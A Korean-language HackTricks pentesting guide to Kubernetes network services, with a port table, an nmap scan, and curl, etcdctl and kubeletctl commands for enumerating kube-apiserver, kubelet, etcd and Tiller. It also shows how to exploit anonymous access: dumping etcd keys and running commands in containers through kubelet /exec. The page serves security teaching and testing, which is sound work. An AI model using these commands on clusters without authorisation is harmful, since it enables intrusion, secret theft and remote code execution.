# 쿠버네티스 서비스의 펜테스팅

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 레포에 PR을 제출하여 해킹 요령을 공유하세요.

</details>
{% endhint %}

쿠버네티스는 여러 **특정 네트워크 서비스**를 사용하며, 이러한 서비스는 **인터넷에 노출**되어 있거나 **한 개의 파드를 침투한 후 내부 네트워크**에서 찾을 수 있습니다.

## OSINT를 사용하여 노출된 파드 찾기

한 가지 방법은 [crt.sh](https://crt.sh)에서 `Identity LIKE "k8s.%.com"`을 검색하여 쿠버네티스와 관련된 서브도메인을 찾는 것입니다. 또 다른 방법은 github에서 `"k8s.%.com"`을 검색하고 해당 문자열을 포함하는 **YAML 파일**을 찾는 것일 수 있습니다.

## 쿠버네티스가 서비스를 노출하는 방법

쿠버네티스가 **서비스를 공개적으로 노출**하는 방법을 이해하는 것이 유용할 수 있습니다:

{% content-ref url="exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## 포트 스캐닝을 통해 노출된 파드 찾기

다음 포트는 쿠버네티스 클러스터에서 열릴 수 있습니다:

| 포트            | 프로세스        | 설명                                                            |
| --------------- | -------------- | ---------------------------------------------------------------------- |
| 443/TCP         | kube-apiserver | 쿠버네티스 API 포트                                                    |
| 2379/TCP        | etcd           |                                                                        |
| 6666/TCP        | etcd           | etcd                                                                   |
| 4194/TCP        | cAdvisor       | 컨테이너 메트릭스                                                      |
| 6443/TCP        | kube-apiserver | 쿠버네티스 API 포트                                                    |
| 8443/TCP        | kube-apiserver | Minikube API 포트                                                      |
| 8080/TCP        | kube-apiserver | 보안되지 않은 API 포트                                                      |
| 10250/TCP       | kubelet        | 전체 모드 액세스를 허용하는 HTTPS API                                |
| 10255/TCP       | kubelet        | 인증되지 않은 읽기 전용 HTTP 포트: 파드, 실행 중인 파드 및 노드 상태 |
| 10256/TCP       | kube-proxy     | Kube Proxy 헬스 체크 서버                                         |
| 9099/TCP        | calico-felix   | Calico의 헬스 체크 서버                                         |
| 6782-4/TCP      | weave          | 메트릭스 및 엔드포인트                                                  |
| 30000-32767/TCP | NodePort       | 서비스로의 프록시                                                  |
| 44134/TCP       | Tiller         | Helm 서비스 리스닝                                                 |

### Nmap

{% code overflow="wrap" %}
```bash
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
{% endcode %}

### Kube-apiserver

이것은 일반적으로 관리자가 도구 **`kubectl`**을 사용하여 대화하는 **API Kubernetes 서비스**입니다.

**일반 포트: 6443 및 443**, 그리고 minikube에서는 8443, 보안이 취약한 경우 8080도 사용됩니다.
```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```
**다음 페이지를 확인하여 민감한 데이터를 얻고 이 서비스와 통신하여 민감한 작업을 수행하는 방법을 알아보세요:**

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

### Kubelet API

이 서비스는 **클러스터의 각 노드에서 실행**됩니다. 이 서비스는 **노드 내의 파드를 제어**하는 역할을 합니다. 이는 **kube-apiserver**와 통신합니다.

만약 이 서비스가 노출되어 있다면, **인증되지 않은 RCE**를 발견한 것일 수 있습니다.

#### Kubelet API
```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```
만약 응답이 `Unauthorized`이면 인증이 필요합니다.

노드 목록을 나열할 수 있다면 다음과 같이 kubelet 엔드포인트 목록을 얻을 수 있습니다:
```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```
#### kubelet (읽기 전용)
```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```
### etcd API
```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### 틸러
```
helm --host tiller-deploy.kube-system:44134 version
```
당신은 이 서비스를 남용하여 Kubernetes 내에서 권한을 상승시킬 수 있습니다:

### cAdvisor

메트릭을 수집하는 데 유용한 서비스입니다.
```
curl -k https://<IP Address>:4194
```
### NodePort

**NodePort**을 통해 포트가 모든 노드에서 노출될 때, 동일한 포트가 모든 노드에서 열리며 트래픽이 선언된 **Service**로 프록시됩니다. 기본적으로 이 포트는 **30000-32767 범위**에 있습니다. 따라서 새로운 확인되지 않은 서비스는 해당 포트를 통해 접근할 수 있습니다.
```
sudo nmap -sS -p 30000-32767 <IP>
```
## 취약한 구성 오류

### Kube-apiserver 익명 액세스

**kube-apiserver API 엔드포인트에 대한 익명 액세스는 허용되지 않습니다**. 그러나 몇 가지 엔드포인트를 확인할 수 있습니다:

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### **ETCD 익명 액세스 확인**

ETCD는 클러스터 비밀, 구성 파일 및 더 많은 **민감한 데이터**를 저장합니다. **기본적으로** ETCD는 **익명으로 액세스할 수 없지만**, 항상 확인하는 것이 좋습니다.

ETCD에 익명으로 액세스할 수 있다면 [**etcdctl**](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md) **도구를 사용해야** 할 수 있습니다. 다음 명령은 저장된 모든 키를 가져올 것입니다:
```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### **Kubelet RCE**

[**Kubelet 문서**](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)에 따르면 **기본적으로 서비스에 대한 익명 액세스가 허용**됩니다:

> Kubelet 서버로의 익명 요청을 활성화합니다. 다른 인증 방법에 의해 거부되지 않은 요청은 익명 요청으로 처리됩니다. 익명 요청은 사용자 이름이 `system:anonymous`이고 그룹 이름이 `system:unauthenticated`인 요청입니다.

**Kubelet API의 인증 및 권한 부여 방식**을 더 잘 이해하려면 이 페이지를 확인하세요:

{% content-ref url="../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

**Kubelet** 서비스 **API는 문서화되어 있지 않지만**, 소스 코드는 여기에서 찾을 수 있으며 노출된 엔드포인트를 찾는 것은 **다음을 실행**하는 것만큼 쉽습니다:
```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```
모두 흥미로워 보입니다.

[Kubeletctl](https://github.com/cyberark/kubeletctl) 도구를 사용하여 Kubelet 및 그 엔드포인트와 상호 작용할 수 있습니다.

#### /pods

이 엔드포인트는 포드와 그 컨테이너 목록을 표시합니다:
```bash
kubeletctl pods
```
#### /exec

이 엔드포인트를 사용하면 어떤 컨테이너 내에서도 코드를 매우 쉽게 실행할 수 있습니다:
```bash
kubeletctl exec [command]
```
{% hint style="info" %}
이 공격을 피하려면 _**kubelet**_ 서비스를 `--anonymous-auth false`로 실행하고 서비스를 네트워크 수준에서 분리해야 합니다.
{% endhint %}

### **Kubelet (읽기 전용 포트) 정보 노출 확인**

**kubelet 읽기 전용 포트**가 노출되면, 미인가된 당사자가 API에서 정보를 검색할 수 있게 됩니다. 이 포트의 노출은 다양한 **클러스터 구성 요소**가 노출될 수 있음을 의미합니다. 정보에는 **팟 이름, 내부 파일 위치 및 기타 구성 요소**가 포함될 수 있지만, 이러한 정보가 중요하지 않더라도 노출은 보안 위험을 초래하며 피해야 합니다.

이 취약점이 어떻게 악용될 수 있는지 예를 들면, 원격 공격자가 특정 URL에 액세스하는 것이 포함됩니다. `http://<external-IP>:10255/pods`로 이동하여 공격자는 kubelet에서 민감한 정보를 검색할 수 있습니다:

![https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## 참고 자료

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 레포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}
